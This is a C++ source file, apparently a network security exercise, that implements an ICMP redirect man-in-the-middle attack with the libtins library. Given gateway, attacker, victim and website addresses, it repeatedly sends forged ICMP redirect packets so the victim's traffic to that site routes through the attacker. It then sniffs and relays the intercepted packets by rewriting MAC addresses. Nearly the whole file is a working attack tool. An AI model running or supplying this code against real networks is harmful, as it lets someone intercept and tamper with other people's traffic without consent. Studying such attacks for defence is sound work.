#define TINS_STATIC
#include <tins/tins.h>
#include <iostream>
#include <string>
#include <stdexcept>
#include <cstdlib>
#include <string>
#include <thread>
#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#else
#include <unistd.h>
#endif // _WIN32
#include <winsock2.h>
#include <WS2tcpip.h>
#include <regex>
#include<process.h>
#include<map>
using namespace std;
using namespace Tins;
using std::cout;
using std::runtime_error;
using std::endl;
std::string URLToAddrStr(std::string addr)
{
	WSADATA wsadata;
	WSAStartup(MAKEWORD(1, 1), &wsadata);
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	struct sockaddr_in *sin;
	int *listen_fd;
	int listen_fd_num = 0;
	char buf[80] = {0x00, };
	int i = 0;
	memset(&hints, 0x00, sizeof(struct addrinfo));
	hints.ai_flags = AI_PASSIVE;
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	if (getaddrinfo(addr.c_str(),NULL, &hints, &result) != 0)
	{
		perror("getaddrinfo");
		return std::string("");
	}
	for (rp = result; rp != NULL; rp = rp->ai_next)
	{
		listen_fd_num++;
	}
	listen_fd = (int *)malloc(sizeof(int)*listen_fd_num);
	printf("Num %d", listen_fd_num);
	for (rp = result, i = 0; rp != NULL; rp = rp->ai_next, i++)
	{
		if (rp->ai_family == AF_INET)
		{
			sin = (sockaddr_in *)rp->ai_addr;
			inet_ntop(rp->ai_family, &sin->sin_addr, buf, sizeof(buf));
			printf("<bind 정보 %d %d %s>\n", rp->ai_protocol, rp->ai_socktype, buf);
			return std::string(buf);
		}
	}
	WSACleanup();
	return std::string("");
}


void icmp_redirect(NetworkInterface iface, IPv4Address gw, IPv4Address attack, IPv4Address victim, IPv4Address webip, const NetworkInterface::Info& info)
{
	PacketSender sender;
	EthernetII::address_type attack_hw, victim_hw, gw_hw;
	attack_hw = info.hw_addr; // my macaddress get
	victim_hw = Utils::resolve_hwaddr(iface, victim, sender); // victim macaddress get
	gw_hw = Utils::resolve_hwaddr(iface, gw, sender);
	cout << " Using victim hw address:  " << victim_hw << "\n";
	cout << " Using own hw address:     " << info.hw_addr << "\n";
	ICMP icmp;
	icmp.set_redirect(1, (IPv4Address)htonl(attack));
	uint8_t *data;
	data = (uint8_t *)malloc(8);
	memset(data, NULL, 8);
	EthernetII victim_icmp = EthernetII(victim_hw, gw_hw) / IP(victim, gw) / icmp / IP(webip, victim) / RawPDU(data, 8);
	EthernetII gw_icmp = EthernetII(attack_hw, gw_hw) / IP(attack, gw) / icmp / IP(webip, gw) / RawPDU(data, 8);
	while (true) {
		sender.send(victim_icmp, iface);
#ifdef _WIN32
		Sleep(500);
#else
		sleep(5);
#endif
	}
}
void relay(PDU *some_pdu, NetworkInterface iface, EthernetII::address_type attack_hw, EthernetII::address_type victim_hw, EthernetII::address_type gw_hw)
{
	PacketSender sender;
	EthernetII *eth = some_pdu->find_pdu<EthernetII>();
	IP *ip = some_pdu->find_pdu<IP>();
	if (ip != NULL)
	{
		if ((eth->src_addr().to_string() == victim_hw.to_string()))
		{
			eth->src_addr(attack_hw);
			some_pdu->send(sender, iface.name());
			cout << "victim -> attack " << endl;
			cout << "eth src :" << eth->src_addr() << endl;
			cout << "eth dst :" << eth->dst_addr() << endl;
			cout << "SRC ip :" << ip->src_addr() << endl;
			cout << "dst ip :" << ip->dst_addr() << endl;
		}
		else if ((eth->dst_addr().to_string() == attack_hw.to_string()))
		{
			eth->dst_addr(victim_hw);
			some_pdu->send(sender, iface.name());
			cout << "web -> attack " << endl;
			cout << "eth src :" << eth->src_addr() << endl;
			cout << "eth dst :" << eth->dst_addr() << endl;
			cout << "SRC ip :" << ip->src_addr() << endl;
			cout << "dst ip :" << ip->dst_addr() << endl;
		}
	}
}

int main(int argc, char* argv[]) {
	if (argc != 5) {
		cout << "Usage: " << *argv << " <Gateway> <Attack> <Victim> <Website_URL>" << endl;
		return 1;
	}
	PacketSender sender;
	EthernetII::address_type attack_hw, victim_hw, gw_hw;
	IPv4Address gw, victim, attack;
	string url;
	try {
		gw = argv[1];
		attack = argv[2];
		victim = argv[3];
		url = argv[4];
		cout << "gate way ip : " << gw << endl;
		cout << "attack ip : " << attack << endl;
		cout << "victim ip : " << victim << endl;
	}
	catch (...) {
		cout << "Invalid ip found...\n";
		return 2;
	}
	NetworkInterface iface;
	NetworkInterface::Info info;
	try {
		iface = gw;
		info = iface.addresses();
		attack_hw = info.hw_addr;
		victim_hw = Utils::resolve_hwaddr(iface, victim, sender); // victim macaddress get
		gw_hw = Utils::resolve_hwaddr(iface, gw, sender); // gateway macaddress get
	}
	catch (runtime_error& ex) {
		cout << ex.what() << endl;
		return 3;
	}
	try {
		if (!URLToAddrStr(url).empty())
		{
			std::thread infect(icmp_redirect, iface, gw, attack, victim, URLToAddrStr(url), info);
			infect.detach();
		}
	}
	catch (runtime_error& ex) {
		cout << "Runtime error: " << ex.what() << endl;
		return 7;
	}
	Sniffer sniff(iface.name());
	cout << "relay.." << endl;
	while (true)
	{
		PDU *pdu = sniff.next_packet();
		relay(pdu, iface, attack_hw, victim_hw, gw_hw);
		delete pdu;
	}
	return 0;
}
